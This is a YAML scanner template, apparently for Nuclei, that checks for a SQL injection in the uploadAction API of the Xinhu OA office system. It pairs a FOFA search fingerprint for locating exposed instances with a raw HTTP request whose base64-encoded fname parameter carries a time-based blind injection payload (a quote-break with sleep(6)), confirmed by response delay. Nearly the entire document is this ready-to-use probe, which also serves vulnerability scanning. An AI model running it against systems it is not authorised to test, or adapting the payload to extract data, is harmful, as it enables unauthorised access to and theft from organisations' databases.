id: xinhu-oa-uploadaction-sql
info:
  name: "信呼OA办公系统 uploadAction 接口 SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: icon_hash="1652488516"
          信呼OA办公系统为开源在线办公平台。其 uploadAction 接口存在SQL注入安全缺陷，攻击者可通过构造恶意输入参数执行非授权SQL指令，实现数据库敏感数据泄露。该漏洞允许远程攻击者绕过身份验证机制，直接对后端数据库进行未授权访问与操作。
  tags: 信呼OA办公系统
http:
- raw:
  - |
    GET /xhoa/api.php?a=getmfilv&m=upload|api&d=task&fileid=1&fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1  
    Host:  
    Sec-Fetch-Dest: empty  
    Accept: application/json, text/javascript, */*; q=0.01  
    Referer: http://127.0.0.1:81/xhoa/  
    Sec-Fetch-Mode: cors  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36  
    Accept-Encoding: gzip, deflate, br, zstd  
    Sec-Fetch-Site: same-origin  
    Accept-Language: zh-CN,zh;q=0.9  
    X-Requested-With: XMLHttpRequest  
    sec-ch-ua-mobile: ?0  
    sec-ch-ua-platform: "Windows"  

  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: dsl
    dsl:
    - duration_1>=6 && duration_1<=8
    condition: and
